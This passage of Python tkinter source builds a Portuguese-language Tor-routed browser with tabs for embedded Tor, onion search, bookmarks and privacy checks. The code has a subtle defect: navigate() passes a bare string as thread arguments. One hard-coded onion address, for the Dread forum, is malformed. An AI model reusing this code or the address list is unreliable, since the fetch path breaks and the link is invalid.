        tk.Button(btns_log, text="🧹 Limpar Log", command=lambda: self.embedded_log.delete("1.0","end"), font=(FONT_MONO, 7, "bold")).pack(side="left", padx=2)
        tk.Button(btns_log, text="📋 Copiar Log", command=lambda: self._copy_text(self.embedded_log.get("1.0","end-1c")), font=(FONT_MONO, 7, "bold")).pack(side="left", padx=2)
        for b in btns_log.winfo_children():
            style_button(b)

        right = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=320)
        right.pack(side="right", fill="y", padx=(5,0))
        right.pack_propagate(False)

        tk.Label(right, text="CONFIG TORRC EMBUTIDO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=(8,4))

        # Config form
        cfg_form = tk.Frame(right, bg=PANEL_BG)
        cfg_form.pack(fill="x", padx=10, pady=4)

        tk.Label(cfg_form, text="SocksPort:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")
        self.embedded_socks_var = tk.StringVar(value="9050")
        ttk.Combobox(cfg_form, textvariable=self.embedded_socks_var, values=["9050", "9150", "9052"], width=10).pack(fill="x", pady=2)

        tk.Label(cfg_form, text="ControlPort:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(8,0))
        self.embedded_control_var = tk.StringVar(value="9051")
        ttk.Combobox(cfg_form, textvariable=self.embedded_control_var, values=["9051", "9151", "9053"], width=10).pack(fill="x", pady=2)

        tk.Label(right, text="TORRC ATUAL", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=10, pady=(12,2))
        self.torrc_text = scrolledtext.ScrolledText(right, height=12, font=(FONT_MONO, 7), bg="#0a121a", fg=TEXT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.torrc_text.pack(fill="both", expand=True, padx=8, pady=4)
        self.torrc_text.insert("1.0", "# torrc será gerado ao iniciar\nSocksPort 9050\nControlPort 9051\nDataDirectory ./tor_embedded/data\n")

        tk.Label(right, text="INSTRUÇÕES MANUAIS:", bg=PANEL_BG, fg="#ffb700", font=(FONT_MONO, 7, "bold"), justify="left").pack(anchor="w", padx=10, pady=(8,2))
        tk.Label(right, text="Se download falhar:\n1. Vai em torproject.org/download\n2. Baixa Expert Bundle\n3. Extrai tor.exe/tor para tor_embedded/bin/\n4. Baixa geoip e geoip6 para tor_embedded/\n5. Clica INICIAR\n\nLinux: sudo apt install tor\nDepois aponta binário para /usr/bin/tor", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), justify="left", wraplength=280).pack(anchor="w", padx=10, pady=2)

    def _build_tor_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="TOR NETWORK // CONTROLO DE CIRCUITO", bg=BG, fg="#ff5c8a", font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Gerencia Tor SOCKS5, verifica IP, troca circuito, nova identidade", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(2,8))

        grid = tk.Frame(parent, bg=BG)
        grid.pack(fill="x", padx=10, pady=5)

        left = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,5), ipady=10, ipadx=10)

        tk.Label(left, text="STATUS TOR", bg=PANEL_BG, fg="#ff5c8a", font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=(5,8))

        self.tor_ports_label = tk.Label(left, text="Procurando Tor em 9050 / 9150...", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), justify="left")
        self.tor_ports_label.pack(anchor="w")

        tk.Label(left, textvariable=self.ip_status_var, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", pady=6)

        circ_frame = tk.Frame(left, bg="#0a121a", highlightthickness=1, highlightbackground="#ff5c8a")
        circ_frame.pack(fill="x", pady=8, ipady=6, ipadx=8)
        tk.Label(circ_frame, text="CIRCUITO TOR:", bg="#0a121a", fg="#ff5c8a", font=(FONT_MONO, 8, "bold")).pack(anchor="w")
        self.circuit_text = tk.Label(circ_frame, textvariable=self.circuit_var, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 8), justify="left", wraplength=500)
        self.circuit_text.pack(anchor="w", pady=4)

        btns = tk.Frame(left, bg=PANEL_BG)
        btns.pack(fill="x", pady=8)
        for txt, cmd, col in [("🔍 VERIFICAR TOR", self.verificar_tor_completo, "#ff5c8a"), ("🔄 NOVA IDENTIDADE", self.new_identity, "#ffb700"), ("🌐 CHECK IP TOR", self.check_ip_tor, ACCENT), ("⚡ CLICA TUDO TOR", self.clica_tudo_tor, "#ff0040")]:
            b = tk.Button(btns, text=txt, command=cmd, font=(FONT_MONO, 8, "bold"), bg=BTN_BG, fg=col, relief="flat", padx=8, pady=6)
            b.pack(side="left", padx=3, fill="x", expand=True)
            style_button(b)
            b.configure(fg=col)

        right = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="left", fill="both", expand=True, padx=(5,0), ipady=10, ipadx=10)

        tk.Label(right, text="CONFIGURAÇÃO PROXY", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=(5,8))

        form = tk.Frame(right, bg=PANEL_BG)
        form.pack(fill="x", pady=2)
        tk.Label(form, text="SOCKS Host:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.socks_host_var = tk.StringVar(value="127.0.0.1")
        tk.Entry(form, textvariable=self.socks_host_var, width=12, font=(FONT_MONO, 9), bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM).pack(side="left", padx=5)
        tk.Label(form, text="Porta:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,2))
        self.socks_port_var = tk.StringVar(value="9050")
        ttk.Combobox(form, textvariable=self.socks_port_var, values=["9050", "9150", "1080"], width=6, font=(FONT_MONO, 9)).pack(side="left", padx=5)

        form2 = tk.Frame(right, bg=PANEL_BG)
        form2.pack(fill="x", pady=6)
        tk.Label(form2, text="Control Port:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.control_port_var = tk.StringVar(value="9051")
        ttk.Combobox(form2, textvariable=self.control_port_var, values=["9051", "9151"], width=6, font=(FONT_MONO, 9)).pack(side="left", padx=5)
        tk.Label(form2, text="Senha Control:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,2))
        self.control_pass_var = tk.StringVar(value="")
        tk.Entry(form2, textvariable=self.control_pass_var, width=12, font=(FONT_MONO, 9), bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, show="*").pack(side="left", padx=5)

        tk.Label(right, text="LOG TOR", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(anchor="w", pady=(12,2))
        self.tor_log = scrolledtext.ScrolledText(right, height=10, font=(FONT_MONO, 8), bg="#0a121a", fg="#ff8aa0", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.tor_log.pack(fill="both", expand=True, pady=2)
        self.tor_log.insert("1.0", "[Tor] Aguardando verificação...\n")

        btn_row = tk.Frame(right, bg=PANEL_BG)
        btn_row.pack(fill="x", pady=6)
        tk.Button(btn_row, text="▶ TENTAR INICIAR TOR", command=self.try_start_tor, font=(FONT_MONO, 8, "bold")).pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        tk.Button(btn_row, text="📖 COMO INSTALAR TOR", command=lambda: webbrowser.open("https://www.torproject.org/download/"), font=(FONT_MONO, 8, "bold")).pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        for b in btn_row.winfo_children():
            style_button(b)

    def _build_onion_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="ONION SEARCH // BUSCA .ONION + DIRETÓRIO", bg=BG, fg="#ff5c8a", font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Ahmia, Torch, DuckDuckGo Onion - tudo via Tor embutido se ativado", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        search_row = tk.Frame(parent, bg=BG)
        search_row.pack(fill="x", padx=10, pady=5)
        tk.Label(search_row, text="Pesquisa:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.onion_search_var = tk.StringVar(value="osint")
        e = tk.Entry(search_row, textvariable=self.onion_search_var, font=(FONT_MONO, 11), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=40)
        e.pack(side="left", padx=8, fill="x", expand=True, ipady=5)
        e.bind("<Return>", lambda ev: self.search_onion())

        for txt, cmd in [("🔍 Ahmia", self.search_onion), ("🦆 DuckDuckGo Onion", self.search_ddg_onion), ("🔥 Torch", self.search_torch)]:
            b = tk.Button(search_row, text=txt, command=cmd, font=(FONT_MONO, 8, "bold"))
            b.pack(side="left", padx=3, ipady=4)
            style_button(b)

        mid = tk.Frame(parent, bg=BG)
        mid.pack(fill="both", expand=True, padx=10, pady=5)

        left = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=300)
        left.pack(side="left", fill="y", padx=(0,5))
        left.pack_propagate(False)

        tk.Label(left, text="DIRETÓRIO .ONION (OSINT)", bg=PANEL_BG, fg="#ff5c8a", font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=(8,4))

        self.onion_list = tk.Listbox(left, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 8), relief="flat", selectbackground="#3a1020", selectforeground="#ff5c8a")
        self.onion_list.pack(fill="both", expand=True, padx=8, pady=4)
        self.onion_list.bind("<Double-Button-1>", lambda e: self._open_onion_selected())

        onion_sites = [
            "🔍 SEARCH - Ahmia - http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion",
            "🔍 SEARCH - Torch - http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion",
            "🔍 SEARCH - DuckDuckGo Onion - https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion",
            "📰 NEWS - ProPublica - http://p53lf57bevgw2hf54ylonbu76h6l5ttsga3g5yov6n7k5y4x2p7k5ad.onion",
            "📰 NEWS - The Guardian - https://guardian2zotagl6tmjucg3lrhxdk4dw3lhbqnkvvkyw4u4jkdiuj4yd.onion",
            "📰 NEWS - NYT - https://nytimesn7cgmftshazwhfgzm37qxb44r64ytbb2dj3x62d2lljsciiyd.onion",
            "📚 LIBRARY - Imperial Library - http://kx5thpx2olielkihfyo4hmqdbb4jsyy4g6ylvs4xrrcukn5s6y5c6ad.onion",
            "📚 LIBRARY - Sci-Hub - http://scihub22266oqcxt.onion",
            "💬 FORUM - Dread - http://dreadytofatroptsdj6io7l3xptbet6onoyno2yvfqsfe2yg14e3fflad.onion",
            "🔐 EMAIL - ProtonMail - https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion",
            "🛡️ SECURITY - Tor Project - http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion",
            "🛡️ CHECK - Tor Check - https://check.torproject.org",
            "🔍 OSINT - Ahmia Fi - https://ahmia.fi",
        ]
        for site in onion_sites:
            self.onion_list.insert("end", site)

        btn_onion_open = tk.Button(left, text="🌐 ABRIR SELECIONADO", command=self._open_onion_selected, bg="#ff5c8a", fg="white", font=(FONT_MONO, 8, "bold"), relief="flat")
        btn_onion_open.pack(fill="x", padx=8, pady=6, ipady=5)

        right = tk.Frame(mid, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=(5,0))

        tk.Label(right, text="RESULTADOS DA PESQUISA", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")

        self.onion_results = scrolledtext.ScrolledText(right, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.onion_results.pack(fill="both", expand=True, pady=4)
        self.onion_results.insert("1.0", "[Onion Search] Digita algo e clica Ahmia/Torch.\n")

    def _build_bookmarks_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="BOOKMARKS & HISTÓRICO", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(side="left")
        tk.Button(top, text="🧹 Limpar Histórico", command=self.clear_history, font=(FONT_MONO, 8, "bold")).pack(side="right", padx=5)
        tk.Button(top, text="💾 Exportar", command=self.export_bookmarks, font=(FONT_MONO, 8, "bold")).pack(side="right", padx=5)
        for b in top.winfo_children():
            if isinstance(b, tk.Button):
                style_button(b)

        mid = tk.Frame(parent, bg=BG)
        mid.pack(fill="both", expand=True, padx=10, pady=5)

        left = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,5))
        tk.Label(left, text="⭐ BOOKMARKS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=6)

        self.bookmarks_list = tk.Listbox(left, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 9), relief="flat", selectbackground=ACCENT_DIM)
        self.bookmarks_list.pack(fill="both", expand=True, padx=8, pady=4)
        self.bookmarks_list.bind("<Double-Button-1>", lambda e: self._open_bookmark())

        for bm in self.bookmarks:
            self.bookmarks_list.insert("end", f"{bm.get('title','')} - {bm.get('url','')}")

        btns = tk.Frame(left, bg=PANEL_BG)
        btns.pack(fill="x", padx=8, pady=6)
        tk.Button(btns, text="➕ Adicionar Atual", command=self.add_bookmark, font=(FONT_MONO, 8, "bold")).pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        tk.Button(btns, text="🗑️ Remover", command=self.remove_bookmark, font=(FONT_MONO, 8, "bold")).pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        for b in btns.winfo_children():
            style_button(b)

        right = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="left", fill="both", expand=True, padx=(5,0))
        tk.Label(right, text="🕒 HISTÓRICO", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=6)

        self.history_list = tk.Listbox(right, bg="#0a121a", fg=TEXT_DIM, font=(FONT_MONO, 8), relief="flat", selectbackground=BTN_BG_HOVER)
        self.history_list.pack(fill="both", expand=True, padx=8, pady=4)
        self.history_list.bind("<Double-Button-1>", lambda e: self._open_history())

        for h in reversed(self.history[-100:]):
            self.history_list.insert("end", f"{h.get('time','')} - {h.get('url','')[:80]}")

    def _build_security_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="SEGURANÇA // ANTI-FINGERPRINT + HEADERS", bg=BG, fg="#00ff88", font=(FONT_MONO, 12, "bold")).pack(anchor="w")

        grid = tk.Frame(parent, bg=BG)
        grid.pack(fill="both", expand=True, padx=10, pady=5)

        left = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,5), ipadx=10, ipady=10)

        tk.Label(left, text="USER-AGENT SPOOF", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=(0,6))

        uas = ["Tor Browser 13.0 (Windows NT 10.0; rv:115.0)", "Tor Browser 13.0 (X11; Linux x86_64; rv:115.0)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15", "AIRES Browser 1.0 (OSINT Lab)"]
        ttk.Combobox(left, textvariable=self.ua_var, values=uas, width=50, font=(FONT_MONO, 9)).pack(fill="x", pady=4)

        tk.Label(left, text="HEADERS DA ÚLTIMA REQUISIÇÃO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", pady=(12,4))
        self.headers_text = scrolledtext.ScrolledText(left, height=12, font=(FONT_MONO, 8), bg="#0a121a", fg=TEXT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.headers_text.pack(fill="both", expand=True, pady=2)
        self.headers_text.insert("1.0", "[Headers] Nenhuma requisição ainda\n")

        right = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="left", fill="both", expand=True, padx=(5,0), ipadx=10, ipady=10)

        tk.Label(right, text="TESTES DE PRIVACIDADE", bg=PANEL_BG, fg="#ffb700", font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=(0,8))

        tests = [("🔍 Tor Check", "https://check.torproject.org/", "Verifica se estás no Tor"), ("🌐 IP Check Clear", "https://api.ipify.org?format=json", "Teu IP real"), ("🧅 IP Check Tor", "https://check.torproject.org/api/ip", "Teu IP via Tor"), ("🛡️ CoverYourTracks", "https://coveryourtracks.eff.org/", "Teste fingerprint EFF"), ("🔬 BrowserLeaks", "https://browserleaks.com/", "Teste vazamento"), ("📡 DNS Leak Test", "https://www.dnsleaktest.com/", "Verifica vazamento DNS")]
        for name, url, desc in tests:
            row = tk.Frame(right, bg=BG, highlightthickness=1, highlightbackground=BTN_BG)
            row.pack(fill="x", pady=2)
            tk.Label(row, text=name, bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold"), width=20, anchor="w").pack(side="left", padx=6, pady=4)
            tk.Label(row, text=desc, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7), width=28, anchor="w").pack(side="left")
            b = tk.Button(row, text="ABRIR", command=lambda u=url: self.navigate(u), font=(FONT_MONO, 7, "bold"), padx=6)
            b.pack(side="right", padx=6)
            style_button(b)

    def _build_tools_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="CONFIGURAÇÃO & FERRAMENTAS AVANÇADAS", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")

        grid = tk.Frame(parent, bg=BG)
        grid.pack(fill="both", expand=True, padx=10, pady=5)

        tools = [("🌐 Abrir no Tor Browser externo", self.open_in_tor_browser, "Tenta abrir URL atual no Tor Browser externo"), ("📡 Testar portas Tor", self.test_all_tor_ports, "Verifica todas as portas Tor"), ("🔄 Limpar Cache", self.clear_cache, "Limpa histórico interno"), ("⚡ CLICA TUDO - Testa tudo", self.clica_tudo_browser, "Faz check Tor + IP + abre sites teste"), ("💾 Instalar dependências", self.install_deps, "Instala libs para Tor funcionar 100%"), ("📖 Documentação Tor", lambda: webbrowser.open("https://tb-manual.torproject.org/"), "Manual oficial Tor")]
        for title, cmd, desc in tools:
            row = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
            row.pack(fill="x", pady=3)
            left = tk.Frame(row, bg=PANEL_BG)
            left.pack(side="left", fill="x", expand=True, padx=10, pady=8)
            tk.Label(left, text=title, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")
            tk.Label(left, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
            b = tk.Button(row, text="EXECUTAR", command=cmd)
            b.pack(side="right", padx=10)
            style_button(b)

    # ==================== Embedded Tor Methods ====================
    def check_embedded_tor_status(self):
        bin_found = self.tor_service.find_binary()
        is_running = self.tor_service.is_running()
        is_installed = self.tor_service.is_installed()

        if is_installed:
            bin_text = f"Binário: ✅ {self.tor_service.tor_binary}"
            if is_running:
                status = f"Serviço Tor: ✅ RODANDO (PID {'externo' if not self.tor_service.process else self.tor_service.process.pid}) - Porta 9050 aberta"
                self.tor_service_status_var.set(status)
                self.embedded_bin_label.configure(text=bin_text, fg="#00ff88")
                self.btn_start_tor.configure(state="disabled", bg=BTN_BG, fg=TEXT_DIM)
                self.btn_stop_tor.configure(state="normal", bg="#ff3b5c", fg="white")
            else:
                status = f"Serviço Tor: ⏸️ PARADO - Binário encontrado mas não rodando"
                self.tor_service_status_var.set(status)
                self.embedded_bin_label.configure(text=bin_text, fg="#ffb700")
                self.btn_start_tor.configure(state="normal", bg="#00ff88", fg="black")
                self.btn_stop_tor.configure(state="disabled", bg=BTN_BG, fg=TEXT_DIM)
        else:
            bin_text = "Binário: ❌ Não encontrado - Clique BAIXAR TOR BUNDLE"
            status = "Serviço Tor: ❌ NÃO INSTALADO - Baixe o Expert Bundle"
            self.tor_service_status_var.set(status)
            self.embedded_bin_label.configure(text=bin_text, fg=ERROR)
            self.btn_start_tor.configure(state="disabled", bg=BTN_BG, fg=TEXT_DIM)

        # Atualiza torrc view
        try:
            if os.path.exists(self.tor_service.torrc_path):
                with open(self.tor_service.torrc_path, "r") as f:
                    self.torrc_text.delete("1.0", "end")
                    self.torrc_text.insert("1.0", f.read())
        except:
            pass

        # Atualiza log
        self.refresh_embedded_log()

    def start_embedded_tor(self):
        self.embedded_log.insert("end", "\n[Iniciando Tor Embutido...]\n")
        self.embedded_log.see("end")
        self.tor_service_status_var.set("Serviço Tor: 🔄 INICIANDO...")

        def worker():
            socks = int(self.embedded_socks_var.get()) if self.embedded_socks_var.get().isdigit() else 9050
            control = int(self.embedded_control_var.get()) if self.embedded_control_var.get().isdigit() else 9051
            ok, msg = self.tor_service.start(socks_port=socks, control_port=control)
            def update():
                self.embedded_log.insert("end", f"[Tor Start] {msg}\n")
                self.embedded_log.insert("end", self.tor_service.get_log(30) + "\n")
                self.embedded_log.see("end")
                self.check_embedded_tor_status()
                self.verificar_tor_completo()
                if ok:
                    self.tor_enabled.set(True)
                    self.socks_port_var.set(str(socks))
                    self.control_port_var.set(str(control))
            self.after(0, update)

        threading.Thread(target=worker, daemon=True).start()

    def stop_embedded_tor(self):
        self.embedded_log.insert("end", "\n[Parando Tor Embutido...]\n")
        def worker():
            ok, msg = self.tor_service.stop()
            def update():
                self.embedded_log.insert("end", f"[Tor Stop] {msg}\n")
                self.embedded_log.see("end")
                self.check_embedded_tor_status()
                self.verificar_tor_completo()
            self.after(0, update)
        threading.Thread(target=worker, daemon=True).start()

    def restart_embedded_tor(self):
        self.stop_embedded_tor()
        self.after(2000, self.start_embedded_tor)

    def download_tor_bundle(self):
        self.embedded_log.insert("end", "\n[Download Tor Bundle] Iniciando...\nIsso pode demorar 2-5 minutos (50-80MB)\n")
        self.embedded_log.see("end")

        def progress_cb(msg):
            self.after(0, lambda: self.embedded_log.insert("end", f"[Download] {msg}\n"))
            self.after(0, lambda: self.embedded_log.see("end"))

        def worker():
            ok, msg = self.tor_service.download_tor_bundle(progress_callback=progress_cb)
            def update():
                self.embedded_log.insert("end", f"\n[Download Resultado] {msg}\n")
                self.embedded_log.see("end")
                self.check_embedded_tor_status()
                if ok:
                    messagebox.showinfo("Tor Instalado", msg + "\n\nAgora clique INICIAR TOR EMBUTIDO")
                else:
                    messagebox.showwarning("Download falhou", msg)
            self.after(0, update)

        threading.Thread(target=worker, daemon=True).start()

    def open_tor_folder(self):
        folder = self.tor_service.tor_dir
        try:
            if platform.system() == "Windows":
                os.startfile(folder)
            elif platform.system() == "Darwin":
                subprocess.Popen(["open", folder])
            else:
                subprocess.Popen(["xdg-open", folder])
        except Exception as e:
            messagebox.showinfo("Pasta Tor", f"Pasta: {folder}\nErro abrir: {e}")

    def refresh_embedded_log(self):
        try:
            log = self.tor_service.get_log(80)
            self.embedded_log.delete("1.0", "end")
            self.embedded_log.insert("1.0", log)
            if not log.strip():
                self.embedded_log.insert("1.0", "[Log vazio - Tor ainda não iniciou]\n")
        except:
            pass

    def clica_tudo_embedded(self):
        self.embedded_log.insert("end", "\n" + "="*50 + "\n[⚡ CLICA TUDO EMBUTIDO] Iniciando instalação + start + check\n" + "="*50 + "\n")
        self.embedded_log.see("end")
        if not self.tor_service.is_installed():
            self.download_tor_bundle()
            self.after(10000, self.start_embedded_tor)
        else:
            self.start_embedded_tor()
        self.after(8000, self.verificar_tor_completo)
        self.after(9000, self.check_ip_tor)

    # ==================== Core Navigation (same as before) ====================
    def navigate(self, url=None, add_history=True):
        if url:
            self.current_url.set(url)
        url = self.current_url.get().strip()
        if not url:
            return
        if url.startswith("about:") or url.startswith("file://"):
            pass
        elif not url.startswith("http://") and not url.startswith("https://"):
            if ".onion" in url:
                if not url.startswith("http"):
                    url = "http://" + url
            else:
                if " " in url or "." not in url:
                    url = f"https://duckduckgo.com/?q={urllib.parse.quote(url)}"
                else:
                    url = "https://" + url
            self.current_url.set(url)

        if add_history and hasattr(self, '_last_url') and self._last_url != url:
            self.back_stack.append(self._last_url)
            self.forward_stack.clear()
        self._last_url = url

        self.secure_label.configure(text="🔄 Carregando..." if ".onion" not in url else "🧅 Onion carregando...")

        if not self.private_mode.get():
            self.history.append({"url": url, "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            if len(self.history) > 500:
                self.history = self.history[-500:]
            save_json(self.history_file, self.history)
            try:
                self.history_list.insert("end", f"{self.history[-1]['time']} - {url[:80]}")
            except:
                pass

        threading.Thread(target=self._fetch_url, args=(url), daemon=True).start()

    def _fetch_url(self, url):
        try:
            session = self._get_session()
            headers = {"User-Agent": self.ua_var.get()}
            self.after(0, lambda: self._update_log(f"[Fetch] GET {url} {'via TOR' if self.tor_enabled.get() else 'direto'}"))
            resp = session.get(url, headers=headers, timeout=15, allow_redirects=True)
            content_type = resp.headers.get("Content-Type", "")
            text = resp.text[:200000]
            headers_str = f"URL: {resp.url}\nStatus: {resp.status_code}\n\nHeaders:\n"
            for k, v in resp.headers.items():
                headers_str += f"{k}: {v}\n"

            def update_ui():
                self.secure_label.configure(text=f"🔒 {resp.status_code} | {len(text)} bytes | {content_type[:30]}", fg="#00ff88" if resp.status_code==200 else "#ffb700")
                try:
                    self.headers_text.delete("1.0", "end")
                    self.headers_text.insert("1.0", headers_str)
                except:
                    pass
                if self.html_frame and "text/html" in content_type:
                    try:
                        self.html_frame.load_html(text, base_url=resp.url)
                    except Exception as e:
                        self._render_text_fallback(text, resp.url, str(e))
                else:
                    self._render_text_fallback(text, resp.url)
                self._extract_links(text, resp.url)

            self.after(0, update_ui)
        except Exception as e:
            self.after(0, lambda: self.secure_label.configure(text=f"❌ Erro: {e}", fg=ERROR))
            self.after(0, lambda: self._render_text_fallback(f"ERRO ao carregar {url}\n\n{e}\n\nDicas:\n• Se for .onion, liga Tor (🧅 TOR) e verifica porta 9050/9150\n• Vai em 🔧 TOR EMBUTIDO e clica INICIAR TOR EMBUTIDO\n• Verifica internet", url, error=str(e)))

    def _get_session(self):
        try:
            import requests
            session = requests.Session()
            if self.tor_enabled.get():
                host = self.socks_host_var.get()
                port = self.socks_port_var.get()
                proxy = f"socks5h://{host}:{port}"
                session.proxies = {"http": proxy, "https": proxy}
            return session
        except ImportError:
            class UrllibSession:
                def get(self, url, headers=None, timeout=10, allow_redirects=True):
                    req = urllib.request.Request(url, headers=headers or {})
                    with urllib.request.urlopen(req, timeout=timeout) as r:
                        class Resp:
                            def __init__(self, r):
                                self.url = r.url
                                self.status_code = r.status
                                self.headers = dict(r.headers)
                                self._data = r.read().decode(errors="ignore")
                                self.text = self._data
                        return Resp(r)
            return UrllibSession()

    def _render_text_fallback(self, html, base_url="", error=""):
        if not hasattr(self, 'browser_text') or not self.browser_text:
            return
        try:
            text = html
            text = re.sub(r'<script.*?</script>', '', text, flags=re.DOTALL|re.IGNORECASE)
            text = re.sub(r'<style.*?</style>', '', text, flags=re.DOTALL|re.IGNORECASE)
            text = re.sub(r'<[^>]+>', '\n', text)
            text = re.sub(r'\n\s*\n', '\n\n', text)
            import html as html_lib
            text = html_lib.unescape(text)
            text = text[:20000]
            self.browser_text.delete("1.0", "end")
            if error:
                self.browser_text.insert("1.0", f"[ERRO] {error}\n\n")
            self.browser_text.insert("end", f"URL: {base_url}\n{'='*60}\n\n{text}\n")
            self.browser_text.see("1.0")
        except Exception as e:
            try:
                self.browser_text.delete("1.0", "end")
                self.browser_text.insert("1.0", f"[Render erro] {e}\n\n{html[:5000]}")
            except:
                pass

    def _extract_links(self, html, base_url):
        try:
            links = re.findall(r'href=[\"\']([^\"\']+)[\"\']', html, re.IGNORECASE)
            full_links = []
            for link in links[:100]:
                if link.startswith("http") or ".onion" in link:
                    full_links.append(link)
                elif link.startswith("/"):
                    try:
                        parsed = urllib.parse.urlparse(base_url)
                        full_links.append(f"{parsed.scheme}://{parsed.netloc}{link}")
                    except:
                        pass
            self.links_list.delete(0, "end")
            for l in full_links[:50]:
                self.links_list.insert("end", l)
        except:
            pass

    def _update_log(self, msg):
        try:
            self.tor_log.insert("end", f"{msg}\n")
            self.tor_log.see("end")
        except:
            pass

    def verificar_tor_completo(self):
        def worker():
            ports = [9050, 9150, 9051, 9151]
            results = {}
            for p in ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                try:
                    res = s.connect_ex(("127.0.0.1", p))
                    results[p] = (res == 0)
                except:
                    results[p] = False
                s.close()

            active_socks = [p for p in [9050, 9150] if results.get(p)]
